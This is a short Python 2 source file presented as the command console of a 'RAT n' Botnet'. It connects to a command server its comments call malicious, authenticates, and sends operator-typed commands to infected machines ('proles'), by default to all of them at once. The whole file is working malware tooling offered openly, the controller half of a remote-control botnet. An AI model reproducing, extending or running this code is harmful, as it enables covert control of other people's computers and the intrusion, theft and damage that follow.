# A Python RAT n' Botnet
#  by Landon in Python2
#   COMMAND-ENTRY C0DE

from socketIO_client import SocketIO
import re

bigBro = raw_input("BigBro Server? >") # Malicious Server IP.
socket = SocketIO("http://" + bigBro, 1984)

# Functions for socket listeners.
class listeners:

    def log(*args):
        print(args[0])

# These two lines set the listeners.
for function in listeners.__dict__:
    socket.on(function, listeners.__dict__[function])

# Authenticates the innerParty with the bigbro server.
socket.emit('authenticate', raw_input("Password? >"))

# This function is used to tokenize Command Line Input.
def tokenize(string):
    tokenizeRegex = re.compile( r"([^\w\n]|[\w]+)\s?(.*)" )
    matches =  tokenizeRegex.match(string)
    return [matches.group(1), matches.group(2)]

to = 'all' # By default, send commands to all proles.
while True:
    CLI     = tokenize( raw_input(to + " - >") ) # Command line tokens.
    command = CLI[0]    # The command itself.
    args    = CLI[1]    # The arguments to the command.

    if   command in ['~', 's', 'switch']: # Switch who the command is sent to.
        to = args

    elif command in ['?', 'l', 'listen']: # Listen for emits for a given time.
        if args == 'forever':   socket.wait()
        else:                   socket.wait(seconds=int(args))

    else:
        socket.emit('command', to, command, args)
        socket.wait(seconds=1)
